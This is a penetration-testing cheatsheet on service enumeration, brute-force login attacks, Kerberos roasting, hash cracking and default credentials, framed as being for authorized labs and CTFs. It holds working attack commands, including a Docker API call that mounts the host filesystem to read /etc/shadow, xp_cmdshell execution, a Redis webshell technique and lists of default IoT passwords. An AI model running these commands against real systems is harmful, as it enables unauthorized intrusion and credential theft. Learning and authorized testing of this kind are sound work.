# LAB SERVICE ACCESS + ENUMERATION + BRUTE FORCE CHEATSHEET (2026)
> **Author:** MD MAHABUBUR RAHMAN

> For **authorized** fights only: your own lab VMs, CTFs, TryHackMe, Hack The Box, and hosts you have explicit written permission to test. Blunt-force is heavy — use it *only* where allowed and throttle every wordlist.

---

## 0. Setup once
```bash
TARGET="10.10.10.50"
export TARGET

# wordlists (Kali default)
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# important tools
sudo apt install -y hydra medusa ncrack patator crackmapexec smbmap enum4linux-ng \
    ldap-utils snmp snmpd redis-tools mongosh jq seclists gobuster wpscan
```

---

## 1. ENUMERATION BY SERVICE

### 21 FTP
```bash
nmap -p21 -sV -sC "$TARGET"
nmap -p21 --script ftp-anon "$TARGET"
ftp "$TARGET"                       # anonymous / anonymous
# inside: ls / dir / pwd / cd <dir> / get <file> / mget * / put <file> / bye
```

### 22 SSH
```bash
nmap -p22 -sV -sC "$TARGET"
nmap -p22 --script ssh2-enum-algos "$TARGET"
ssh USER@"$TARGET"
# inside: whoami / hostname / pwd / ls / cat <file> / exit
```

### 23 Telnet
```bash
nmap -p23 -sV -sC "$TARGET"
telnet "$TARGET"                    # many embedded devices: admin/admin, root/root
# inside: whoami / hostname / pwd / ls / exit
```

### 25 SMTP
```bash
nmap -p25 -sV -sC "$TARGET"
nmap -p25 --script smtp-commands,smtp-open-relay "$TARGET"
nc -nv "$TARGET" 25
# EHLO test / HELO test / VRFY username / EXPN username / QUIT
```

### 53 DNS
```bash
nmap -p53 -sV -sC "$TARGET"
dig @"$TARGET" example.local
dig @"$TARGET" example.local ANY
dig @"$TARGET" TARGET.com AXFR        # zone transfer = jackpot
dig @"$TARGET" version.bind chaos txt  # DNS version
```

### 80 / 443 HTTP(S)
```bash
nmap -p80,443 -sV -sC "$TARGET"
curl -s -I "http://$TARGET"
curl -sk -I "https://$TARGET"
whatweb "https://$TARGET"
ffuf -u "http://$TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,307,401,403
gobuster dir -u "http://$TARGET" -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### 110 POP3 / 143 IMAP
```bash
nmap -p110,143 -sV -sC "$TARGET"
nc -nv "$TARGET" 110
# POP3: USER username / PASS password / LIST / STAT / RETR 1 / QUIT
nc -nv "$TARGET" 143
# IMAP: a LOGIN user pass / a LIST "" "*" / a SELECT INBOX / a FETCH 1 BODY[] / a LOGOUT
```

### 111 rpcbind / 2049 NFS
```bash
nmap -p111,2049 -sV -sC "$TARGET"
rpcinfo -p "$TARGET"
showmount -e "$TARGET"
sudo mount -t nfs "$TARGET:/SHARE" /mnt     # if readable -> enumerate files
```

### 139/445 SMB / NetBIOS + Active Directory
```bash
nmap -p139,445 -sV -sC "$TARGET"
nmap -p445 --script smb-protocols,smb-enum-shares,smb-os-discovery,smb2-security-mode "$TARGET"
smbclient -L "//$TARGET/" -N
smbclient "//$TARGET/SHARE" -N        # ls / cd / get / mget / exit
smbmap -H "$TARGET"                   # share perms at a glance
crackmapexec smb "$TARGET"            # null session / os / signing
enum4linux -a "$TARGET"               # users, shares, sessions
rpcclient -U "" "$TARGET" -N          # srvinfo, enumdomusers
# AD-specific
kerbrute userenum --dc "$TARGET" -d DOMAIN.LOCAL users.txt       # no brute, just AS-REP pre-auth user enum
crackmapexec smb "$TARGET" -u '' -p '' --shares
```

### 161/162 SNMP
```bash
nmap -sU -p161 -sV "$TARGET"
snmpwalk -v2c -c public "$TARGET"             # try: public / private / community
snmpwalk -v1  -c public "$TARGET" 1.3.6.1.2.1.1.1    # system info
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$TARGET"
```

### 389/636 LDAP
```bash
nmap -p389,636 -sV -sC "$TARGET"
ldapsearch -x -H "ldap://$TARGET" -b "" -s base        # root DSE
ldapsearch -x -H "ldap://$TARGET" -b "DC=DOMAIN,DC=LOCAL" "(objectClass=user)"
# -b for authenticated if creds found; anonymous bind is the bug to hunt
```

### 1433 MSSQL / 1521 Oracle / 3306 MySQL / 5432 PostgreSQL
```bash
nmap -p1433 -sV -sC "$TARGET" ; nmap -p1433 --script ms-sql-info,ms-sql-brute "$TARGET"
impacket-mssqlclient USER:PASSWORD@"$TARGET" -windows-auth
# if you get in (even low priv): SELECT IS_SRVROLEMEMBER('sysadmin'); EXEC xp_cmdshell 'whoami';

nmap -p1521 -sV -sC "$TARGET"
# oracle sid tooling: odat (Oracle Database Attack Toolkit) for sid/listener poisoning

nmap -p3306 -sV -sC --script mysql-info "$TARGET"
mysql -h "$TARGET" -u USER -p
# SHOW DATABASES; / USE DATABASE; / SHOW TABLES; / SELECT * FROM TABLE; / EXIT;

nmap -p5432 -sV -sC "$TARGET"
psql -h "$TARGET" -U USER -d DATABASE
# \l / \c DATABASE / \dt / SELECT * FROM TABLE; / \q
```

### 2375/2376 Docker
```bash
nmap -p2375 -sV "$TARGET"
curl "http://$TARGET:2375/version"         # if JSON -> unauthenticated API = host RCE
curl "http://$TARGET:2375/containers/json"
curl -X POST "http://$TARGET:2375/containers/create?name=pwn" -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["cat","/etc/shadow"],"Binds":["/:/mnt"]}'   # implies host FS read
```

### 3389 RDP / 5900 VNC
```bash
nmap -p3389 -sV -sC --script rdp-enum-encryption,rdp-ntlm-info "$TARGET"
xfreerdp /v:"$TARGET" /u:USER
nmap -p5900 -sV -sC "$TARGET"
vncviewer "$TARGET:5900"
# VNC blacklist after ~6 tries -> use small wordlists, never lockout a lab
```

### 6379 Redis / 11211 Memcached / 9200 Elasticsearch / 27017 MongoDB
```bash
nmap -p6379 -sV -sC "$TARGET"
redis-cli -h "$TARGET"
# PING / INFO / DBSIZE / KEYS * / GET <key> / QUIT
# no-auth + writable: CONFIG SET dir /var/lib/redis + dbfilename -> webshell/crontab RCE (lab only)

nc -nv "$TARGET" 11211                  # printf "stats\n" | nc
# stats / items / cached keys if no auth

nmap -p9200 -sV -sC "$TARGET"
curl "http://$TARGET:9200/"                       # cluster info -> leak
curl "http://$TARGET:9200/_cat/indices?v"         # index list (PII?)
curl "http://$TARGET:9200/_search?q=password&size=5"

nmap -p27017 -sV -sC "$TARGET"
mongosh "mongodb://$TARGET:27017"
# show dbs / use DATABASE / show collections / db.COLLECTION.find() / exit
```

### 8080 / 8443 alt-web
```bash
nmap -p8080 -sV -sC "$TARGET"
curl -I "http://$TARGET:8080" ; whatweb "http://$TARGET:8080"
ffuf -u "http://$TARGET:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt
nmap -p8443 -sV -sC "$TARGET"
curl -sk -I "https://$TARGET:8443" ; whatweb "https://$TARGET:8443"
# dashboards here: Grafana 3000, Kibana 5601, Proxx/Prometheus 9090, ActiveMQ 8161+61616, ZooKeeper 2181
```

### General Nmap workflow
```bash
nmap -p- "$TARGET"                          # all TCP
nmap -sV -sC -p- "$TARGET"                  # + versions/scripts
nmap -A -p21,22,23,25,53,80,110,111,139,143,161,389,443,445,2049,3306,3389,5432,5900,6379,8080,8443,9200,27017 "$TARGET"
nmap -sU --top-ports 50 -sV "$TARGET"       # UDP: 53,69,123,161,162,500,514
```

---

## 2. BRUTE FORCE ATTACKS (do this ONLY on authorized labs)

### 2.1 Hydra — all-in-one
```bash
USERS=/usr/share/seclists/Usernames/top-usernames-shortlist.txt
PASS=/usr/share/wordlists/rockyou.txt

hydra -L $USERS -P $PASS ftp://$TARGET
hydra -L $USERS -P $PASS -t 4 ssh://$TARGET            # slow for ssh, avoid lockout
hydra -L $USERS -P $PASS telnet://$TARGET
hydra -L $USERS -P $PASS smtp://$TARGET -e nsr         # null/same-as-user/reversed
hydra -L $USERS -P $PASS pop3://$TARGET
hydra -L $USERS -P $PASS imap://$TARGET
hydra -L $USERS -P $PASS smb://$TARGET
hydra -L $USERS -P $PASS smb2://$TARGET
hydra -L $USERS -P $PASS rdp://$TARGET                  # NOTE: RDP can lock accounts / crash sessions
hydra -L $USERS -P $PASS vnc://$TARGET                 # VNC bans after tries; use top-100 list only
hydra -l root  -P $PASS mysql://$TARGET
hydra -L $USERS -P $PASS postgres://$TARGET
hydra -l sa    -P $PASS mssql://$TARGET
hydra -P $PASS snmp://$TARGET                          # community strings
hydra -L $USERS -P $PASS ldap2://$TARGET               # ldap:// is "ldap2"
hydra -L $USERS -P $PASS redis://$TARGET
hydra -l admin -P $PASS http-get://$TARGET/           # basic auth
hydra -l admin -P $PASS https-post-form://$TARGET/login.php:user=^USER^&pass=^PASS^:F=incorrect
hydra -l admin -P $PASS http-post-form://$TARGET/login:username=^USER^&password=^PASS^:F=Invalid:C=/panel
# flags: -f (stop at first), -o out.txt, -t 16 threads, -w seconds, -e nsr, -C combo.txt
```

### 2.2 Medusa (parallel cross-protocol)
```bash
medusa -h "$TARGET" -U $USERS -P $PASS -M ssh
medusa -h "$TARGET" -U $USERS -P $PASS -M ftp
medusa -h "$TARGET" -U $USERS -P $PASS -M rdp
medusa -h "$TARGET" -U $USERS -P $PASS -M smbnt
medusa -h "$TARGET" -U $USERS -P $PASS -M mysql
medusa -h "$TARGET" -U $USERS -P $PASS -M http -m DIR:/login.cgi
medusa -h "$TARGET" -U $USERS -P $PASS -M snmp
```

### 2.3 Ncrack
```bash
ncrack -U $USERS -P $PASS "$TARGET:22"
ncrack -U $USERS -P $PASS "$TARGET:445"
ncrack -U $USERS -P $PASS "$TARGET:3389"
ncrack -U $USERS -P $PASS "$TARGET:5900"    # can check VNC auth
ncrack -U $USERS -P $PASS "$TARGET:21,ssh,smb"
```

### 2.4 CrackMapExec / NetExec (the modern way — SMB/AD/WinRM/via LDAP)
```bash
crackmapexec smb "$TARGET" -u $USERS -p $PASS --continue-on-success
crackmapexec smb "$TARGET" -u $USERS -p $PASS --shares --users
crackmapexec winrm "$TARGET" -u $USERS -p $PASS     # valid cred = psexec/winrm RCE
crackmapexec ssh "$TARGET" -u $USERS -p $PASS
crackmapexec ldap "$TARGET" -u $USERS -p $PASS --asrep-roast
# password spray (NOT brute force) — 1 pass for all users:
crackmapexec smb "$TARGET" -u $USERS -p 'Spring2026!'
```

### 2.5 Patator (modular)
```bash
patator ssh_login host="$TARGET" user=COMBO00 password=COMBO01 0=$USERS 1=$PASS -x ignore:fgrep='denied'
patator ftp_login host="$TARGET" user=COMBO00 password=COMBO01 0=$USERS 1=$PASS
patator http_fuzz url="http://$TARGET/login.php" method=POST \
  body='user=COMBO00&pass=COMBO01' 0=$USERS 1=$PASS -x ignore:fgrep='Login failed'
patator smb_login host="$TARGET" user=COMBO00 password=COMBO01 0=$USERS 1=$PASS
```

### 2.6 WordPress / web-app brute
```bash
wpscan --url "http://$TARGET" --enumerate u,vp,vt       # find real usernames first
wpscan --url "http://$TARGET" -U users.txt -P $PASS --max-threads 5
ffuf -w $PASS -X POST -d "username=admin&password=FUZZ" -u "http://$TARGET/wp-login.php" \
     -H "Content-Type: application/x-www-form-urlencoded" -fr "Login failed"
```

### 2.7 Metasploit aux (alternative, scripted)
```bash
msfconsole -q
use auxiliary/scanner/ftp/ftp_login          # set RHOSTS, USER_FILE, PASS_FILE
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/http/wordpress_login_enum
# set STOP_ON_SUCCESS true, THREADS 5, run
```

### 2.8 Better than brute force: ROAST + OFFLINE cracking (gets hits without touching the service)
```bash
# Kerberoasting (AD)
impacket-GetUserSPNs -dc-ip "$TARGET" DOMAIN.LOCAL/user:pass -request > hashes.txt
hashcat -m 13100 hashes.txt $PASS

# AS-REP roasting (no pre-auth users)
impacket-GetNPUsers -dc-ip "$TARGET" -usersfile users.txt DOMAIN.LOCAL/

# NetNTLMv2 relay capture
sudo responder -I eth0                 # then trigger auth (URIs, UNC paths) - lab ONLY
hashcat -m 5600 captured.txt $PASS

# crack what you already stole (never touch the service again)
john --format=NT --wordlist=$PASS ntlm.txt
hashcat -m 1000   ntlm.txt $PASS       # NTLM
hashcat -m 1800   sha512crypt.txt $PASS
hashcat -m 3200   bcrypt.txt $PASS
hashcat -m 0      md5.txt $PASS
hashcat -m 100    sha1.txt $PASS
hashcat -m 13100  krb5tgs.txt $PASS    # kerberoast
hashcat -m 22000  wpa.hc22000 $PASS
```

### 2.9 Default / weak credential fast list (try BEFORE hydra)
```bash
# generic
admin/admin   admin/password   admin/admin123   root/root   root/toor
guest/guest   user/user        test/test         oracle/oracle  scott/tiger

# IoT/embedded (telnet 23) - lab devices only
root/xc3511   admin/1234   user/userpass   service/zuu85242

# services
redis <no auth>   mongo <no auth>   docker 2375 <no auth>   ES 9200 <no auth>
postgres/postgres  postgres/password  mysql/root  sa/P@ssw0rd  rabbitmq/guest:guest
```

---

## 3. BRUTE FORCE PLAYBOOK (do it RIGHT)
```text
1. ENUMERATE the real usernames first (RID cycling, kerbrute, smb users, wp usernames).
   Never guess users when you can harvest them — halves the work.
2. PREFER a password spray to a brute force: 1 password x all users, THEN escalate.
3. Use the SMALLEST list that makes sense (top-1000 for RDP/VNC, rockyou for FTP/SSH if scope allows).
4. Throttle: ssh -t 2..4, rdp 1..2, add --delay/-w. Rapid retries = lockouts + blue team alarms.
5. Check for account lockout policy BEFORE starting (CVE-2025 UAC-by-assignment lockout tricks aside, lockouts DESTROY labs).
6. Stop on first success (-f), log every attempt (-o), keep wordlist start/end time for the report.
7. NEVER brute force: an actively used production account, logins without fail2ban questions, VNC after 3 tries.
8. When you win: confirm impact quietly, screenshot proof, STOP. Do not continue the wordlist.
9. Detection blend: rotate source IP/NAT is NOT allowed; slow timing only within written scope.
```

---

## 4. IMPORTANT PORTS QUICK REFERENCE

### Remote access
| Port | Service |
|------|---------|
| 22 | SSH |
| 23 | Telnet |
| 3389 | RDP |
| 5900 | VNC |

### File transfer / sharing
| Port | Service |
|------|---------|
| 20/21 | FTP (+data) |
| 69 | TFTP |
| 139 | NetBIOS Session |
| 445 | SMB |
| 873 | rsync |
| 2049 | NFS |

### Web
| Port | Service |
|------|---------|
| 80/443 | HTTP(S) |
| 3000 | Node/Grafana |
| 5000 | Flask/Docker Registry |
| 5601 | Kibana |
| 8000/8080/8081 | Alt HTTP |
| 8443 | Alt HTTPS / admin |
| 8888 | Proxy/Jupyter |
| 9000 | SonarQube/web |
| 9090 | Prometheus |
| 8161/61616 | ActiveMQ web+transport |

### Email
| Port | Service |
|------|---------|
| 25 | SMTP |
| 110/995 | POP3(S) |
| 143/993 | IMAP(S) |
| 465/587 | SMTPS / submission |

### DNS / network
| Port | Service |
|------|---------|
| 53 | DNS |
| 67/68 | DHCP |
| 111 | rpcbind |
| 161/162 | SNMP |
| 514 | syslog |
| 631 | IPP/CUPS |

### Windows / AD
| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | MSRPC |
| 139/445 | NetBIOS/SMB |
| 389/636 | LDAP(S) |
| 464 | Kerberos pw change |
| 3268/3269 | Global Catalog |
| 3389 | RDP |
| 5985/5986 | WinRM |

### Databases
| Port | Service |
|------|---------|
| 1433 | MSSQL |
| 1521 | Oracle |
| 3306 | MySQL/MariaDB |
| 5432 | PostgreSQL |
| 6379 | Redis |
| 9200/9300 | Elasticsearch |
| 27017 | MongoDB |

### Container / cloud
| Port | Service |
|------|---------|
| 2375/2376 | Docker (plain/TLS) |
| 5000/5001 | Registry |
| 6443 | Kubernetes API |
| 10250 | Kubelet |
| 15000/15001 | Istio |
| 2181 | ZooKeeper |
| 15672/5672 | RabbitMQ mgmt/AMQP |

---

## 5. SECURITY MINDSET (the part that makes you a pro)
```text
OPEN PORT != VULNERABLE.

For every discovered service:
  1. Identify the service
  2. Identify the EXACT version  (nmap -sV + banner + product page)
  3. Enumerate configuration    (auth on? encryption? writable dirs? default creds?)
  4. Check authentication       (anonymous? default creds? weak policy? lockout?)
  5. Check information disclosure (banners, indices, shares, listeners)
  6. Research applicable CVEs   (searchsploit, nuclei -t cves/, exploit-db)
  7. VALIDATE ONLY on authorized targets (your VM, CTF, THM/HTB, written-permission scope)
  8. Document: service, version, config, CVE (if any), proof, impact, remediation

Use exploitation modules / brute force ONLY against:
  - your own machines
  - intentionally vulnerable VMs
  - CTFs, TryHackMe, Hack The Box
  - explicitly authorized penetration-test targets
```